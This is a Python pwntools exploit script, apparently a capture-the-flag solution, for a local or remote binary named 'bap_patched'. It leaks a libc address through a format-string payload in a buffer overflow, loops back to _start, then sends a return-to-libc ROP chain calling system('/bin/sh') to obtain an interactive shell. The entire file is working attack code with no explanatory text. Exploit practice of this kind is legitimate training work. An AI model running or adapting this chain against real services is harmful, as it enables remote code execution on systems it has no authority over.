from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b _start
b main
b *(main +69)
continue
'''.format(**locals())

exe = './bap_patched'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('./libc.so.6')
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'info'


io = start()

_start_addr = elf.sym['_start']
data_section = 0x404040 #para rbp, luego da igual porque llamo a _start y seteo rbp de nuevo para poder volver a hacer bof

payload = flat( b"%p %p %p".ljust(0x10, b">"),
                data_section,
                _start_addr
                )
io.sendlineafter(b":", payload)

leak = int(io.recvuntil(b">").replace(b">", b"").strip().split(b" ")[2], 16)
log.success(hex(leak))

libc.address = leak - elf.libc.sym['_IO_2_1_stdin_']

ret = libc.address + ROP(elf.libc).find_gadget(["ret"]).address
pop_rdi = libc.address + ROP(elf.libc).find_gadget(["pop rdi", "ret"]).address
bin_sh = libc.address + next(elf.libc.search(b"/bin/sh\x00"))
system = libc.symbols['system']
print(hex(system))

ropchain = flat(
    ret,
    pop_rdi,
    bin_sh,
    system
)

payload = b"K"*0x18 + ropchain
io.sendlineafter(b":", payload)

io.interactive()
io.close()